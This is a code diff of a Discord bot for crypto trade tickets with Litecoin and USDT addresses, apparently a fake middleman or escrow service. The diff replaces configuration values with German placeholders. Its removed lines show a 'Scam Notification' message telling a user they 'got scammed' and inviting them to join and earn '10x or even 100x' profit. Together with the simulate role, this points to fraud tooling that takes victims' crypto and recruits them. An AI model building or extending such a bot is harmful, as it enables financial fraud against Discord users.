@@ -1,6 +1,5 @@
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType, ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js');
 const express = require('express');
-const config = require('./config.js');
 
 const client = new Client({
   intents: [
@@ -15,13 +14,14 @@ const app = express();
 app.use(express.json());
 
 // ============ KONFIGURATION ============
-let TOS_CHANNEL_ID = config.TOS_CHANNEL_ID;
-let TICKET_CATEGORY_ID = config.TICKET_CATEGORY_ID;
-let LTC_ADDRESS = config.LTC_ADDRESS;
-let USDT_ADDRESS = config.USDT_ADDRESS;
-let LOG_CHANNEL_ID = config.LOG_CHANNEL_ID;
-let SIMULATE_ROLE_ID = config.SIMULATE_ROLE_ID;
-const SUPER_OWNER = BigInt(config.SUPER_OWNER);
+let TOS_CHANNEL_ID = 'TOS_CHANNEL_ID_HIER';
+let TICKET_CATEGORY_ID = 'TICKET_CATEGORY_ID_HIER';
+let LTC_ADDRESS = 'DEINE_LTC_ADRESSE';
+let USDT_ADDRESS = 'DEINE_USDT_ADRESSE';
+let LOG_CHANNEL_ID = 'LOG_CHANNEL_ID_HIER';
+let SIMULATE_ROLE_ID = 'SIMULATE_ROLE_ID_HIER';
+const SUPER_OWNER = 1472661189824872622n; // DEINE DISCORD ID
+let owners = new Set();
 let tickets = {}; // ticketId: { trader1, trader2, giving1, giving2, sender, receiver, usdAmount, ltcAmount, currency, copyUsed }
 
 // ============ LTC PREIS API ============
@@ -105,7 +105,7 @@ client.on('ready', async () => {
       .addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true)),
   ].map(cmd => cmd.toJSON());
 
-  const rest = new REST({ version: '10' }).setToken(config.TOKEN);
+  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
   await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
 });
 
@@ -597,8 +597,8 @@ client.on('interactionCreate', async (interaction) => {
     const user = interaction.options.getUser('user');
   
     const mercyEmbed = new EmbedBuilder()
-      .setTitle('Scam Notification') // <-- ändern
-      .setDescription('We are verry sorry to inform you that you got scammed./nBut you have the chance to join us and make 10x or even 100x the profit if you are active./nThe choice is yours.') // <-- ändern
+      .setTitle('DEIN TITEL HIER') // <-- ändern
+      .setDescription('DEIN TEXT HIER') // <-- ändern
       .setColor(0x2b2d31);
 
     const acceptBtn = new ButtonBuilder()
